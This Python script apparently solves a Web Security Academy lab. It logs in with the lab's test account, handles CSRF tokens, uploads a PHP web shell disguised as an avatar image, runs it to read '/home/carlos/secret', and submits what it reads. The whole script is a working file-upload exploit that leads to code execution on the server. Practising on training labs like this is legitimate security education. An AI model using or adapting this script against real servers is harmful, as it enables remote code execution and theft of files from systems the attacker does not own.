import requests
from bs4 import BeautifulSoup

s = requests.Session()

site = 'acb81f8a1fbd664cc0a909e0004f008b.web-security-academy.net'

login_url = f'https://{site}/login'
resp = s.get(login_url)
soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

login_data = {'password': 'peter', 'username': 'wiener', 'csrf': csrf}
resp = s.post(login_url, data=login_data)

soup = BeautifulSoup(resp.text, 'html.parser')
csrf = soup.find('input', {'name': 'csrf'}).get('value')

upload_url = f'https://{site}/my-account/avatar'
multipart_form_data = {
    'csrf': (None, csrf),
    'user': (None, 'wiener'),
    'avatar': ('secret.php', "<?php echo file_get_contents('/home/carlos/secret'); ?>")
}
resp = s.post(upload_url, files=multipart_form_data)

secret_url = f'https://{site}/files/avatars/secret.php'
resp = s.get(secret_url)
secret = resp.text

solution_url = f'https://{site}/submitSolution'
solution_data = {
    'answer' : secret
}
s.post(solution_url, data=solution_data)